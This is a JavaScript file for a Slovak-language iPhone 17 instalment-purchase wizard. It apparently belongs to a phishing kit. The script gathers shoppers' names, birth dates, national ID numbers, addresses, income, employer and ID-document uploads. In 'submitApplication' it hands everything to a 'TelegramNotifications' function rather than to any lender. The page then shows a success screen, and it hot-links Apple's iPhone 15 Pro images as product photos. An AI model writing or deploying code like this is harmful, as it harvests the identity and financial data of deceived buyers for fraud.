document.addEventListener('DOMContentLoaded', () => {
    // This script is for the wizard-style split payment page (iphone17-split-payment.html)

    // Define products locally for this page to ensure it's self-contained.
    const productsForSplitPaymentIphone17 = [
        {
            id: 'iphone17',
            name: 'iPhone 17',
            variants: [
                { storage: '128GB', price: 1099 },
                { storage: '256GB', price: 1199 },
            ],
            colors: ['Polárna žiara', 'Vesmírna čierna', 'Púštna zlatá'],
            image: 'https://citymagazine.b-cdn.net/wp-content/uploads/2025/08/hero-series-iphone17-2025-0-1400x933.webp'
        },
        {
            id: 'iphone17plus',
            name: 'iPhone 17 Plus',
            variants: [
                { storage: '128GB', price: 1199 },
                { storage: '256GB', price: 1299 },
            ],
            colors: ['Polárna žiara', 'Vesmírna čierna', 'Púštna zlatá'],
            image: 'https://citymagazine.b-cdn.net/wp-content/uploads/2025/08/hero-series-iphone17-2025-0-1400x933.webp'
        },
        {
            id: 'iphone17pro',
            name: 'iPhone 17 Pro',
            variants: [
                { storage: '256GB', price: 1399 },
                { storage: '512GB', price: 1599 },
                { storage: '1TB', price: 1799 },
            ],
            colors: ['Titánová čierna', 'Prírodný titán', 'Púštny titán'],
            image: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_display_pro_large.jpg'
        },
        {
            id: 'iphone17promax',
            name: 'iPhone 17 Pro Max',
            variants: [
                { storage: '256GB', price: 1499 },
                { storage: '512GB', price: 1699 },
                { storage: '1TB', price: 1899 },
            ],
            colors: ['Titánová čierna', 'Prírodný titán', 'Púštny titán'],
            image: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_display_pro_max_large.jpg'
        }
    ];

    // --- STATE MANAGEMENT ---
    let state = {
        currentStep: 1,
        selectedProduct: null,
        selectedVariant: null,
        selectedColor: null,
        selectedPlan: { months: 6, interest: 2 }, // Default plan
    };

    // --- DOM ELEMENTS ---
    const wizardSteps = document.querySelectorAll('.wizard-step');
    const stepIndicators = document.querySelectorAll('.step');
    const productGrid = document.getElementById('product-selection-grid');
    
    // Step 2 elements
    const selectedProductSummary = document.getElementById('selected-product-summary');
    const storageSelect = document.getElementById('storage-select');
    const colorSelect = document.getElementById('color-select');
    const monthsSelect = document.getElementById('months-select');
    const calculationSummary = document.getElementById('calculation-summary');

    // Step 3 elements
    const customerForm = document.getElementById('customer-info-form');
    const employmentStatusSelect = document.getElementById('employment-status');
    const employerGroup = document.getElementById('employer-group');

    // Step 4 elements
    const termsCheckbox = document.getElementById('terms-agree-checkbox');
    const submitBtn = document.getElementById('submit-application-btn');

    // --- INITIALIZATION ---
    function initializePage() {
        // Pass the product data directly to the functions that need it.
        populateProductGrid(productsForSplitPaymentIphone17);
        populateMonths();
        setupEventListeners(productsForSplitPaymentIphone17);
        goToStep(1); // Start at step 1
    }

    // --- UI POPULATION ---
    function populateProductGrid(products) {
        if (!productGrid) return;
        productGrid.innerHTML = '';
        products.forEach(product => {
            const card = document.createElement('div');
            card.className = 'product-card';
            card.innerHTML = `
                <div class="product-image"><img src="${product.image}" alt="${product.name}"></div>
                <div class="product-info">
                    <h3 class="product-name">${product.name}</h3>
                    <div class="product-price">
                        <span class="current-price">Od ${convertPrice(product.variants[0].price, false)}</span>
                    </div>
                    <button class="btn btn-primary select-product-btn" data-product-id="${product.id}">Vybrať Produkt</button>
                </div>
            `;
            productGrid.appendChild(card);
        });
    }

    function populateMonths() {
        if (!monthsSelect) return;
        monthsSelect.innerHTML = '';
        const plans = [
            { months: 6, interest: 2.5 }, 
            { months: 12, interest: 3.5 }, 
            { months: 20, interest: 4.9 }, 
            { months: 24, interest: 6 }
        ];
        plans.forEach(plan => {
            const option = document.createElement('option');
            option.value = plan.months;
            option.textContent = `${plan.months} Mesiacov (+${plan.interest}%)`;
            option.dataset.interest = plan.interest;
            monthsSelect.appendChild(option);
        });
        // Set default plan in state
        state.selectedPlan = plans[0];
    }

    // --- EVENT LISTENERS ---
    function setupEventListeners(products) {
        // Product selection
        productGrid?.addEventListener('click', e => {
            if (e.target.classList.contains('select-product-btn')) {
                const productId = e.target.dataset.productId;
                state.selectedProduct = products.find(p => p.id === productId);
                if (state.selectedProduct) {
                    goToStep(2);
                    configureProductStep();
                }
            }
        });

        // Wizard navigation
        document.querySelector('.split-payment-wizard')?.addEventListener('click', e => {
            if (e.target.closest('[data-action="next"]')) goToStep(state.currentStep + 1);
            if (e.target.closest('[data-action="prev"]')) goToStep(state.currentStep - 1);
        });

        // Configuration dropdowns
        storageSelect?.addEventListener('change', handleConfigurationChange);
        colorSelect?.addEventListener('change', handleConfigurationChange);
        monthsSelect?.addEventListener('change', handleConfigurationChange);

        // Form validation
        customerForm?.addEventListener('input', checkFormCompletion);
        termsCheckbox?.addEventListener('change', checkFormCompletion);
        submitBtn?.addEventListener('click', submitApplication);

        employmentStatusSelect?.addEventListener('change', () => {
            if (employmentStatusSelect.value === 'employed' || employmentStatusSelect.value === 'self-employed') {
                employerGroup.style.display = 'block';
                document.getElementById('employer-name').required = true;
            } else {
                employerGroup.style.display = 'none';
                document.getElementById('employer-name').required = false;
            }
        });
    }

    // --- WIZARD LOGIC ---
    function goToStep(step) {
        if (step > 4) { // Handle success step
            wizardSteps.forEach(s => s.classList.remove('active'));
            document.getElementById('wizard-success-step').classList.add('active');
            stepIndicators.forEach(ind => ind.classList.add('active')); // Mark all as complete
            return;
        }

        state.currentStep = step;
        wizardSteps.forEach(s => s.classList.remove('active'));
        document.getElementById(`wizard-step-${step}`)?.classList.add('active');
        stepIndicators.forEach((ind, i) => {
            ind.classList.toggle('active', i + 1 <= step);
            ind.classList.toggle('completed', i + 1 < step);
        });
        window.scrollTo(0, 0);
    }

    function configureProductStep() {
        if (!selectedProductSummary || !storageSelect || !colorSelect) return;

        selectedProductSummary.innerHTML = `<img src="${state.selectedProduct.image}" alt="${state.selectedProduct.name}"><h3>${state.selectedProduct.name}</h3>`;

        storageSelect.innerHTML = `<option value="">-- Vyberte úložisko --</option>`;
        state.selectedProduct.variants.forEach(v => {
            storageSelect.innerHTML += `<option value="${v.storage}" data-price="${v.price}">${v.storage} - ${convertPrice(v.price, false)}</option>`;
        });

        colorSelect.innerHTML = `<option value="">-- Vyberte farbu --</option>`;
        state.selectedProduct.colors.forEach(c => {
            colorSelect.innerHTML += `<option value="${c}">${c}</option>`;
        });

        resetConfig();
    }

    function resetConfig() {
        storageSelect.value = '';
        colorSelect.value = '';
        monthsSelect.value = state.selectedPlan.months;
        state.selectedVariant = null;
        state.selectedColor = null;
        calculationSummary.style.display = 'none';
        document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
    }

    function handleConfigurationChange() {
        const storageOption = storageSelect.options[storageSelect.selectedIndex];
        if (storageOption && storageOption.value) {
            state.selectedVariant = { storage: storageOption.value, price: parseFloat(storageOption.dataset.price) };
        } else {
            state.selectedVariant = null;
        }
        state.selectedColor = colorSelect.value || null;

        const planOption = monthsSelect.options[monthsSelect.selectedIndex];
        state.selectedPlan = {
            months: parseInt(planOption.value),
            interest: parseFloat(planOption.dataset.interest)
        };
        
        if (state.selectedVariant && state.selectedColor) {
            updateCalculations();
            calculationSummary.style.display = 'block';
            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = false;
        } else {
            calculationSummary.style.display = 'none';
            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
        }
    }

    function updateCalculations() {
        if (!state.selectedVariant || !state.selectedPlan) return;
        
        const basePrice = state.selectedVariant.price;
        const interestAmount = basePrice * (state.selectedPlan.interest / 100);
        const totalPrice = basePrice + interestAmount;
        const monthlyPayment = totalPrice / state.selectedPlan.months;

        document.getElementById('summary-price').textContent = convertPrice(basePrice, false);
        document.getElementById('summary-interest-rate').textContent = state.selectedPlan.interest;
        document.getElementById('summary-interest-amount').textContent = convertPrice(interestAmount, false);
        document.getElementById('summary-total-price').textContent = convertPrice(totalPrice, false);
        document.getElementById('summary-monthly').textContent = convertPrice(monthlyPayment, false);
    }

    function checkFormCompletion() {
        if (!customerForm) return;

        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
        const allFilled = requiredFields.every(field => field.value.trim() !== '');
        
        const nextBtn = document.querySelector('#wizard-step-3 [data-action="next"]');
        if (nextBtn) nextBtn.disabled = !allFilled;

        submitBtn.disabled = !allFilled || !termsCheckbox.checked;
    }

    function submitApplication() {
        if (!state.selectedProduct || !state.selectedVariant || !state.selectedColor || !validateCustomerInfo() || !termsCheckbox.checked) {
            alert("Prosím, vyplňte všetky povinné polia a súhlaste s podmienkami.");
            return;
        }

        const customerData = {
            name: document.getElementById('customer-name').value,
            dob: document.getElementById('customer-dob').value,
            email: document.getElementById('customer-email').value,
            phone: document.getElementById('customer-phone').value,
            nationalId: document.getElementById('customer-national-id').value,
            address: document.getElementById('customer-address').value,
            employment: document.getElementById('employment-status').options[document.getElementById('employment-status').selectedIndex].text,
            employer: document.getElementById('employer-name').value || 'N/A',
            income: document.getElementById('monthly-income').value,
            idFront: document.getElementById('id-upload-front').files[0]?.name || 'Not provided',
            idBack: document.getElementById('id-upload-back').files[0]?.name || 'Not provided',
            addressProof: document.getElementById('address-proof-upload').files[0]?.name || 'Not provided'
        };

        if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.splitPaymentApplicationSubmitted) {
            TelegramNotifications.splitPaymentApplicationSubmitted({
                productName: `${state.selectedProduct.name} (${state.selectedVariant.storage} - ${state.selectedColor})`,
                total: document.getElementById('summary-total-price').textContent,
                monthly: document.getElementById('summary-monthly').textContent + " / month",
                months: monthsSelect.value,
                customer: customerData,
                country: window.currentCountry.toUpperCase()
            });
        }

        goToStep(5); // Go to success step
    }

    function validateCustomerInfo() {
        if (!customerForm) return false;
        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
        return requiredFields.every(field => field.value.trim() !== '');
    }

    // --- START ---
    initializePage();
});
